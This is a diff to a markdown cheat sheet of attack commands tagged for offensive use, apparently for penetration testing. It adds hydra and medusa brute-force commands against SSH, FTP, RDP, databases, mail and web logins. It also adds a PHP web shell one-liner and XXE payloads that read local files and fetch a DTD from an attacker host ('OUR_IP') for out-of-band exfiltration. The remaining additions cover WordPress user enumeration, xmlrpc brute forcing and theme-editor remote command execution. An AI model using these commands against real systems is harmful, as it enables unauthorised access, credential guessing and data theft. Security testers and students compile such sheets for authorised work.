@@ -258,7 +258,7 @@ sqlmap -u "<targetURL>" --dump -T <table> -D <database> -C <column1,column2>
 sqlmap -u "<targetURL>" --schema
 ```
 
-## SQLi - sqlmap anti-csrf token bypass 
+## SQLi - sqlmap anti-csrf token bypass
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
 sqlmap -u "<targetURL>" --data="<key=value&csrf-token=value>" --csrf-token="<csrf-token>"
@@ -357,37 +357,236 @@ hydra -C <wordlist> <IP> -s <port> http-get <loginPath>
 ## Login Brute Forcing - POST form
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
-hydra -l user -P <wlist> <ip>:<port> http-post-form "/<login.php>:<UserParameter>=^USER^&<PasswdParameter>=^PASS^:F=<ErrMsg:form name='log-in'>”
+hydra -l <username> -P <wlist> -s <port> <targetIP> http-post-form "<path2endpoint>:<UserParameter>=^USER^&<PasswdParameter>=^PASS^:F=<ErrMsg>”
 ```
 
-## Login Brute Forcing - Brute Force Usernames
+## Login Brute Forcing - hydra - Basic Auth
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
-hydra -L <SecLists/Usernames/Names/names.txt> -P <SecLists/Passwords/Leaked-Databases/rockyou.txt> -u -f <IP> -s <port> http-get /
+hydra -l <username> -P <passwdlst> http-get://<targetIP>:<port>/
 ```
 
-## Login Brute Forcing - SSH
+## Login Brute Forcing - hydra - SSH
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
-hydra -L <wlistUser> -P <wlistPasswd> -u -f ssh://<target>:22 -t 4
+hydra -L <wlistUser> -P <wlistPasswd> ssh://<target>:<port>
 ```
 
-## Login Brute Forcing - FTP
+## Login Brute Forcing - hydra - FTP
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
 hydra -l <user> -P <passwdsList> ftp://<target>
 ```
 
-## Login Brute Forcing - General
+## Login Brute Forcing - hydra - General
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
 hydra -l <username> -P <passwordsList> -u -f -t 4 ssh://<targetURL>:<port>
 ```
 
-## Login Brute Forcing - XXEinjector
+## Login Brute Forcing - hydra - XXEinjector
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
 ruby XXEinjector.rb --host=<AttackerIP> --httpport=<ourPORT> --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+```
+
+## Login Brute Forcing - filter - min length
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+grep -E '^.{<minLen>,}$' <wlist>
+```
+
+## Login Brute Forcing - filter - uppercase
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+grep -E '[A-Z]' <wlist>
+```
+
+## Login Brute Forcing - filter - lowercase
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+grep -E '[a-z]' <wlist>
+```
+
+## Login Brute Forcing - filter - numbers
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+grep -E '[0-9]' <wlist>
+```
+
+## Login Brute Forcing - hydra - multiple ssh
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+hydra -l <user> -p <passw> -M <targetsWlist> ssh
+```
+
+## Login Brute Forcing - hydra - hybrid attack
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+hydra -l <username> -x <minchar>:<maxchar>:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <targetIP> <protocol>
+```
+
+## Login Brute Forcing - medusa - ftp
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M ftp -h <target> -u <username> -P <passwdlst>
+```
+
+## Login Brute Forcing - medusa - HTTP
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M http -h <target> -U <usernamelst> -P <passwdlst> -m DIR:/login.php -m FORM:<userparam>=^USER^&<passwdparam>=^PASS^
+```
+
+## Login Brute Forcing - medusa - IMAP
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M imap -h <mail-example-com> -U <users-txt> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - MySQL
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M mysql -h <target> -u <username> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - POP3
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M pop3 -h <mail-example-com> -U <users-txt> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - RDP
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M rdp -h <target> -u <username> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - SSH
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M ssh -h <target> -u <username> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - Subversion svn
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M svn -h <target> -u <username> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - Telnet
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M telnet -h <target> -u <username> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - VNC
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M vnc -h <target> -P <passwords-txt>
+```
+
+## Login Brute Forcing - medusa - Web Form
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -M web-form -h <target> -U <users-txt> -P <passwords-txt> -m FORM:"<userParam>=^USER^&<passwdParam>=^PASS^:F=<ErrMsg>"
+```
+
+## Login Brute Forcing - medusa - Multiple Basic Auth HTTP
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -H <web_servers-txt> -U <usernames-txt> -P <passwords-txt> -M http -m GET
+```
+
+## Login Brute Forcing - medusa - Testing for Empty or Default Passwords
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+medusa -h <target> -U <usernames-txt> -e ns -M <service_name>
+```
+## Login Brute Forcing - list open ports and listening services
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+netstat -tulpn | grep LISTEN
+```
+
+## Broken Auth - filters to match policy
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+grep '[[:upper:]]' /<wlist> | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
+```
+
+## Broken Auth - get world cities wordlist
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+wget https://raw.githubusercontent.com/datasets/world-cities/refs/heads/main/data/world-cities.csv
+```
+
+## Broken Auth - extract city wordlists
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
+```
+
+## Broken Auth - extract specific country cities wordlists
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+cat world-cities.csv | grep <Germany> | cut -d ',' -f1 > <country>_cities.txt
+```
+
+## Web Attacks - XXE - webshell - hosted (then host it on a webserver)
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+```
+
+## Web Attacks - XXE - join entity file - hosted (then host it on a webserver)
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+```
+
+## Web Attacks - XXE - call join entity (on target)
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+echo '<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %xxe;
+]>'
+```
+
+## Web Attacks - XXE - Error based hosted file (then host it on a webserver)
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+## Web Attacks - XXE - join entity file - error based (then host it on a webserver)
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+## Web Attacks - XXE - Automated OOB exfiltration
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+ruby XXEinjector.rb --host=<tun0 IP> --httpport=<httpPort8000> --file=<requestFile> --path=<localFileToRead> --oob=http --phpfilter
+```
+
+## Web attacks - php web server
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+php -S 0.0.0.0:8000
+```
+
+## LFI - ftp server
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+sudo python -m pyftpdlib -p 21
 ```
 
 ## Wordpress - wpscan users
@@ -395,8 +594,69 @@ ruby XXEinjector.rb --host=<AttackerIP> --httpport=<ourPORT> --file=/tmp/xxe.req
 ```
 wpscan --url <targetURL> -e u
 ```
+
 ## Wordpress - wpscan plugins
 #plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
 ```
 wpscan --url <targetURL> -e ap
+```
+
+## Wordpress - core version enum - source code
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl -s -X GET <url> | grep '<meta name="generator"'
+```
+
+## Wordpress - plugin enum - source code
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl -s -X GET <url> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+```
+
+## Wordpress - themes enum - source code
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl -s -X GET <url> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
+```
+
+## Wordpress - test for a specific plugin or diretory listing
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+<baseURL>/wp-content/plugins/<pluginName>
+```
+
+## Wordpress - manual user enumeration - 301 code -> user exists
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl -s -I <baseURL>/?author=1
+```
+
+## Wordpress - manual user enumeration json file
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl <baseURL>/wp-json/wp/v2/users | jq
+```
+
+## Wordpress - xmlrpc login
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" <baseURL>/xmlrpc.php
+```
+
+## Wordpress - wpscan - enumerate
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+wpscan --url <url> --enumerate
+```
+
+## Wordpress - xmlrpc brute force
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+wpscan --password-attack xmlrpc -t 20 -U <username> -P <wlist> --url <url>
+```
+
+## Wordpress - theme editor rce
+#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
+```
+curl -X GET "<baseURL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
